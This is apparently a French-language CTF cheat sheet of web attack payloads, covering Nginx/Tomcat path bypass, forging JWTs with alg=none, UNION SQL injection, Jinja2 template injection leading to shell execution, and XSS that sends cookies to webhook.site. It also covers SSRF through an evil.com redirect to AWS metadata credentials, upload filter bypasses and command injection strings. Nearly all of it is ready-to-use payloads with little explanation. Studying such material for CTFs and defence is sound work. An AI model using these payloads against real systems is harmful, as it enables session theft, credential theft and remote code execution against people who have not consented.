# Writeups Web — Exemples de challenges résolus

## Path Traversal / Nginx + Spring mismatch
**Challenge**: bypass.ictf — "Press button → Get flag"
**Technique**: Semicolon path parameter abuse (matrix parameters)
```bash
curl 'https://target/api/;/admin/flag'
```
**Pourquoi ça marche**: Nginx ne transforme pas les `;` → le bloc deny `/api/admin/flag` n'est pas déclenché.
Tomcat normalise `/api/;/admin/flag` → `/api//admin/flag` → `/api/admin/flag` → route matchée.
**Flag**: `ictf{f0ll0w_th3_wh1t3_r4bb1t}`

---

## JWT None Algorithm
**Technique**: Changer l'algorithme en `none`, supprimer la signature
```python
import base64, json
header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip("=")
payload = base64.b64encode(json.dumps({"admin":True,"user":"admin"}).encode()).decode().rstrip("=")
token = f"{header}.{payload}."
```

---

## SQL Injection UNION-based
```bash
# Détection
' OR 1=1--
' OR '1'='1
# UNION
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password,NULL FROM users--
# Bypass filtre
'/**/UNION/**/SELECT/**/1,2,3--
```

---

## SSTI (Server-Side Template Injection)
```python
# Jinja2
{{7*7}}  # → 49 = vulnérable
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}
# RCE
{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()}}
# Twig
{{7*'7'}}  # → 49
# Freemarker
${7*7}
```

---

## XSS → Cookie steal
```html
<script>fetch('https://webhook.site/UUID?c='+document.cookie)</script>
<img src=x onerror="fetch('https://webhook.site/UUID?c='+btoa(document.cookie))">
```

---

## SSRF
```bash
# Bypass localhost
http://127.0.0.1/
http://0.0.0.0/
http://[::1]/
http://localhost.localdomain/
# Bypass via DNS rebinding
# Bypass via redirect
http://evil.com/redirect?url=http://169.254.169.254/
# AWS metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## File Upload bypass
```bash
# Bypass extension check
shell.php.jpg
shell.php%00.jpg
shell.pHp
# Bypass MIME type check
# Changer Content-Type en image/jpeg mais garder le code PHP
# Magic bytes — ajouter GIF89a au début d'un .php
```

---

## Command Injection
```bash
; id
| id
`id`
$(id)
&& id
# Bypass espace
{id}
$IFS
# Bypass caractères filtrés
$'\x69\x64'  # = id
```
